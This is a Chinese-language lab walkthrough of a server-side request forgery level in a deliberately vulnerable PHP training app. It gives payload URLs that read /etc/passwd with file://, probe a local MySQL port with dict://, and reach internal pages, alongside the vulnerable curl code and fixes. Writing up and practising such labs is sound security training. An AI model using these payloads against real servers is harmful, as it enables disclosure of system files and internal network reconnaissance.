> 漏洞原理：后端拿到 GET 参数`url`，直接交给 PHP `curl_exec()`，**由靶场服务器去访问你传入的地址，返回结果给浏览器**。
> curl 支持多种协议：`http://`、`file://`、`dict://`、`gopher://`，这是本关利用点。
> 参数名：`url`，GET 传参，直接浏览器拼接 URL 即可，不需要抓包。

原始页面点击 “来读一首诗”，URL 类似：

```
ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php
```

## 1、基础测试：让服务器访问外网（验证漏洞通不通）

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8081.ap-shanghai2.cloudstudio.club/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com
```

页面会返回百度的 HTML 代码，证明 SSRF 生效。

## 2、file:// 协议读取 Linux 服务器本地文件（你的靶场是 Linux）

读取`/etc/passwd`

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8081.ap-shanghai2.cloudstudio.club/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
```

> 
> 靶场服务器自己读取本机的 passwd 文件，返回内容展示在页面上。

##3、dict:// 协议探测本机开放端口（内网探测）
dict 协议可以探测端口，看端口是否开放，示例探测 MySQL 3306 端口：

```
.../ssrf_curl.php?url=dict://127.0.0.1:3306
```

- 如果返回 mysql 版本信息 →端口开放
- 如果超时 / 报错 →端口关闭CSDN博...

##4、访问本机内网 web 页面

```
.../ssrf_curl.php?url=http://127.0.0.1
```

## 后端源码（漏洞根源）

```
$URL = $_GET['url'];
$CH = curl_init($URL);
curl_setopt($CH, CURLOPT_HEADER, FALSE);
curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
$RES = curl_exec($CH);
curl_close($CH);
echo $RES;
```

> 
> 用户可控`url`参数直接送入 curl_init，**没有过滤协议、没有禁止内网 IP**，造成 SSRF。

## 漏洞危害

1. 读取服务器本地敏感文件（`file://`）
2. 探测内网 IP、端口扫描（dict 协议）
3. 访问内网 Web 服务；gopher 协议还可以攻击内网 redis/mysql 服务。

## 修复方案

1. 白名单：只允许`http://`和`https://`协议，禁用 file://、dict://、gopher://
2. 拒绝访问内网 IP 段（127.0.0.1、10.x、172.16‑31、192.168）
3. 关闭 curl 跟随跳转，限制请求超时时间。